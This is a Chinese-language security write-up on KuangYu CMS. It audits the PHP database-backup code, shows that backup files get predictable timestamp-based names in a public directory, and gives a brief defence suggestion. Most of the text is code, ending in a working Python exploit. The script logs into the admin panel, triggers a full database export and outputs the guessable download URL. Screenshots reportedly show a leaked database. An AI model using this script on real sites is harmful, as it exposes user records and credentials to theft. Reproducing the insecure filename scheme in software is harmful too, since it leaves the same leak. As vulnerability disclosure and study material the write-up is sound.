# 狂雨CMS数据库备份地址爆破

## 审计

`application/admin/controller/Database.php->export()`

```php
public function export($tables = null, $id = null, $start = null){
        if($this->request->isPost() && !empty($tables) && is_array($tables)){ //初始化
            ......

            //生成备份文件信息
            $file = [
                'name' => date('Ymd-His', time()),
                'part' => 1,
            ];

            ......

            //创建备份文件
            $Database = new Databasec($file, $config);
            if(false !== $Database->create()){
                $tab = ['id' => 0, 'start' => 0];
                $this->success('初始化成功！', '', ['tables' => $tables, 'tab' => $tab]);
            } else {
                $this->error('初始化失败，备份文件创建失败！');
            }

            ......

        } elseif ($this->request->isGet() && is_numeric($id) && is_numeric($start)) { //备份数据

            ......

        } else {
            $this->error('请指定要备份的表！');
        }
    }
```

跟进`Databasec`类

`extend/databasec/Databasec.php->create()`

```php
public function __construct($file, $config, $type = 'export'){
        $this->file   = $file;
        $this->config = $config;
    }
```

```php
public function create(){
        $sql  = "-- -----------------------------\n";
        $sql .= "-- Think MySQL Data Transfer \n";
        $sql .= "-- \n";
        $sql .= "-- Host     : " . config('database.hostname') . "\n";
        $sql .= "-- Port     : " . config('database.hostport') . "\n";
        $sql .= "-- Database : " . config('database.database') . "\n";
        $sql .= "-- \n";
        $sql .= "-- Part : #{$this->file['part']}\n";
        $sql .= "-- Date : " . date("Y-m-d H:i:s") . "\n";
        $sql .= "-- -----------------------------\n\n";
        $sql .= "SET FOREIGN_KEY_CHECKS = 0;\n\n";
        return $this->write($sql);
    }
```

继续跟进`write`函数

`extend/databasec/Databasec.php->write()`

```php
private function write($sql){
        $size = strlen($sql);

        //由于压缩原因，无法计算出压缩后的长度，这里假设压缩率为50%，
        //一般情况压缩率都会高于50%；
        $size = $this->config['compress'] ? $size / 2 : $size;

        $this->open($size);

        return $this->config['compress'] ? @gzwrite($this->fp, $sql) : @fwrite($this->fp, $sql);
    }
```

跟进`open`函数

`extend/databasec/Databasec.php->open()`

```php
private function open($size){
        if($this->fp){
            $this->size += $size;
            if($this->size > $this->config['part']){
                $this->config['compress'] ? @gzclose($this->fp) : @fclose($this->fp);
                $this->fp = null;
                $this->file['part']++;
                session('backup_file', $this->file);
                $this->create();
            }
        } else {
            $backuppath = $this->config['path'];
            $filename   = "{$backuppath}{$this->file['name']}-{$this->file['part']}.sql";
            if($this->config['compress']){
                $filename = "{$filename}.gz";
                $this->fp = @gzopen($filename, "a{$this->config['level']}");
            } else {
                $this->fp = @fopen($filename, 'a');
            }
            $this->size = filesize($filename) + $size;
        }
    }
```

可以看到文件名由`file['name']`+`-`+`file['part']`+`.sql(.gz)`组成，`name`是格式化后的time，`part`为1，因此可直接爆破文件名，从而泄露数据库

### 防御方法

利用随机数生成文件名，然后发送邮件至管理员邮箱或发送短信至手机，增加爆破难度

## 漏洞复现

后台可以直接备份数据库，备份后为.sql.gz文件(可以在设置里更改是否压缩)，文件名为time函数生成的时间戳，可直接爆破进行下载，这里先附上exp(因为不会进行验证码的识别，所以修改了代码将验证部分注释掉了，师傅们见谅~)

Python爆破脚本

```python
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# author: Forthrglory
import requests
import time

def getDatabase(url,username, password):
    session = requests.session()

    u = 'http://%s/admin/index/login.html' % (url)
    head = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    data = {
        'username': username,
        'password': password,
        'code': 1
    }
    session.post(u, data, headers = head)

    u = 'http://%s/admin/database/export.html' % (url)
    data = {
        'layTableCheckbox':'on',
        'tables[0]':'ky_ad',
        'tables[1]':'ky_addons',
        'tables[2]':'ky_bookshelf',
        'tables[3]':'ky_category',
        'tables[4]':'ky_collect',
        'tables[5]':'ky_comment',
        'tables[6]':'ky_config',
        'tables[7]':'ky_crontab',
        'tables[8]':'ky_link',
        'tables[9]':'ky_member',
        'tables[10]':'ky_menu',
        'tables[11]':'ky_news',
        'tables[12]':'ky_novel',
        'tables[13]':'ky_novel_chapter',
        'tables[14]':'ky_route',
        'tables[15]':'ky_slider',
        'tables[16]':'ky_template',
        'tables[17]':'ky_user',
        'tables[18]':'ky_user_menu'
    }
    t = time.strftime("%Y%m%d-%H%M%S", time.localtime())

    session.post(u, data = data)

    for i in range(0, 19):
        u2 = 'http://%s/admin/database/export.html?id=%s&start=0' % (url, str(i))
        session.get(u2)

    t = 'http://' + url + '/public/database/' + t + '-1.sql.gz'
    return t

if __name__ == '__main__':
    u = '127.0.0.1'
    username = 'admin'
    password = 'admin'
    t = getDatabase(u, username, password)
    print(t)
```

运行代码，得到路径(默认生成路径为/public/database/，可在设置中修改)

![2Z9dpibMEs1PUcB](./resource/狂雨CMS数据库备份地址爆破/media/2Z9dpibMEs1PUcB.png)

直接访问下载

![kxcNeHhSqviyfpR](./resource/狂雨CMS数据库备份地址爆破/media/kxcNeHhSqviyfpR.png)

可以看到所有数据库信息全在了

![p2VETuFUze3lDZS](./resource/狂雨CMS数据库备份地址爆破/media/p2VETuFUze3lDZS.png)

## 参考

https://www.cnblogs.com/0daybug/p/12624364.html